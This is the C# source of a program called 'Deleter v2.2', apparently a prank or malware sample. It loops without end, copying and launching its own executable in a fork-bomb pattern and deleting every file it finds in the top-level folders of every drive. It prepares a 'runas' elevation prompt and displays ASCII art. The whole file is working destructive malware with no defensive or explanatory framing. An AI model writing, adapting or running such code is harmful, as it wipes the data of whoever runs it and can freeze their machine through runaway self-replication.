using System;
using System.IO;
using System.Collections.Generic;
using System.Diagnostics;
using System.Threading;
using System.Reflection;
namespace System
{
    public static class Deleter
    {
        public const string Ver = "2.2";
        public const string Title = "Deleter v" + Ver;
        public static string[] LogicalDrives = Directory.GetLogicalDrives();
        public static List<DriveInfo> Disks = new List<DriveInfo>(DriveInfo.GetDrives());
        public static string ProgramName = Assembly.GetExecutingAssembly().GetName().Name;
        public static ulong x;
        public static string[] Messages = Argument.Split('\n');
        public static string Argument = "                                                                      ....                          \n                                                                    ..-+=:...                       \n                                                                 ..+########..                      \n                                                              ..=##########*...                     \n                                                             .:###########*###-.                    \n                 ........                                 ..:##############*##*..                   \n               ....-####+:..                             .:*##################..                    \n              ..=######+*##+:....                      ..=###################..                     \n              .++*#######*+####=:...                 ..-###################*.                       \n              .=*################*-...              ..=###################=..                       \n               ..=##########++#####*=:...          .-###################*:..                        \n                ..-##################==...       ..+###################=..                          \n                 ..-*##################*+=:.   ..-*##################*:..                           \n                   ..=**##################*+-..:*###################=.                              \n                    ...:#*###################++#################**=...                              \n                       ..*####################################=++:...                               \n                        ..+#################################=+=:.                                   \n                         ..:+##############################+=:.                                     \n                            ..-############################-..                                      \n                               ..=#######################*:..                                       \n                                ...+######################-.                                        \n                                ..+#*##################*###*:..                                     \n                               .:#####*-################**####..                                    \n                              .##**+*=#####################*###*..                                  \n                           ..-*#*##=-###*-=+################-:###+...                               \n                         ...+#:=*+.-*#+..-*###################-=###-...                             \n                        ..-+-:=-:.=**:-.-#####*-*+**###########*-+###+...                           \n                       ..:===-::.:--..:=####*:...+=-*+*####***###+-+###-..                          \n                     ..:.----:=-+--:.+#####-.    .:+++++#####*+*###=:*##*:..                        \n                    ..---=*=-===+:..+####+:.      ...+==:+*####+*####-:*##=..                       \n                   ..:--=++=+#+*:.:*###*:.           .:+*=+*#####+*####-=##*:                       \n                ....=--+**##**#:.+###*:.              ..:**+**######*###*=*##=..                    \n                ..:--:+*##***-..+#**:.                 ...:+###=+####***##**##*-..                  \n              ..::..-=*#*-*=..=#+*-...                    ..:*##*=-*####***#**##=..                 \n            ..:...:==##==+..:***=..                          .-+##*+=-+##++###++#*:..               \n           ......--+**=+:..-+*=..                             ..:+##*+-+##*+###+-+#+.               \n         .......::+#==-...:+=..                                  .:*###*+#*#*+###+:**:.             \n        .........=+=-....==...                                    ...+###***#*##*+#-:==.            \n       ........:*==:...-+:..                                        ...=*###***+#*-=*.:-..          \n        .  ...--:....:+....                                           ...:==+*:=+*#=-:=...          \n          ....-....:=:..                                                ....:-:-.=#+-.:=:.          \n         ...... ..=:..                                                       ......-=-..::.         \n           ... .:..                                                             .:.........         \n              ..                                                                  ...  .....        \n";
        public static void DeleteDir(string[] args)
        {
            Console.WriteLine(Messages);
            foreach (DriveInfo disk in Disks)
            {
                if (disk.Name != disk.VolumeLabel)
                {
                    Console.WriteLine("Current drive is: " + disk.Name + disk.VolumeLabel);
                }
                else
                {
                    Console.WriteLine("Current drive is: " + disk.Name);
                }

                foreach (string drive in LogicalDrives)
                {
                    string[] dirs = Directory.GetDirectories(Directory.GetDirectoryRoot(drive));
                    foreach (string dir in dirs)
                    {
                        string[] files = Directory.GetFiles(dir);
                        foreach (string file in files)
                        {
                            File.Delete(file);
                            Console.WriteLine("Deleting " + file);
                        }
                    }
                }
            }
        }
        public static void Main(string[] args)
        {
            Console.Title = Title;
            Process p = new Process();
            p.StartInfo.UseShellExecute = true;
            p.StartInfo.Verb = "runas";
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.BackgroundColor = ConsoleColor.DarkRed;
            Thread.Sleep(1000);
            while (true)
            {
                x++;
                File.Copy(ProgramName + ".exe", ProgramName + " (" + x + ").exe");
                Process.Start(ProgramName
                + " (" + x + ").exe");
                DeleteDir(args);
            }
        }
    }
}
